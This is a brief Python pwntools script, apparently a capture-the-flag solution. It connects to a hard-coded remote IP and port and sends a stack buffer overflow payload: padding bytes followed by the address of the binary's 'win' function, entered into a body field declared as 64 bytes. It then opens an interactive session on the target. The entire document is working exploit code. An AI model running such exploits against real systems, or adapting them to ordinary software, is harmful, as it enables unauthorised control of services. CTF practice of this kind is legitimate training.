
from pwn import *
HOST="163.44.103.107"
PORT=25252
r= remote(HOST, PORT)
elf=ELF("./chal")
win_addr = elf.symbols['win']
payload = b'A' * 0x70 + p64(win_addr)

r.sendlineafter(b'body size> ', b'64')
r.sendlineafter(b'title> ', b'a')
r.sendlineafter(b'body> ', payload)
r.interactive()
